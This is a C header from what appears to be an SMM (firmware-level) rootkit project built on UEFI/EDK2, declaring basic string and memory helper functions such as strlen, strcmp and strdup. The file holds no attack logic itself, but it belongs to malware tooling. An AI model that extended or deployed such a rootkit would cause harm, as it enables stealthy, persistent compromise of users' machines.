#ifndef __smmrootkit_string_h__
#define __smmrootkit_string_h__

#include <Base.h>
#include "MemManager.h" // strdup

#ifdef __GNUC__
typedef UINT32 size_t;
#endif

size_t strlen(const CHAR8 *str);

CHAR8 *strcat(CHAR8 *destination, const CHAR8 *source);

INT32 memcmp(const VOID *str1, const VOID *str2, size_t count);

INT32 strcmp(const CHAR8 *s1, const CHAR8 *s2);

INT32 strncmp(const CHAR8 *s1, const CHAR8 *s2, size_t n);

INT32 stricmp(const CHAR8 *s1, const CHAR8 *s2);

const CHAR8 *strstr(const CHAR8 *X, const CHAR8 *Y);

CHAR8 *strdup(CHAR8 *src);

#endif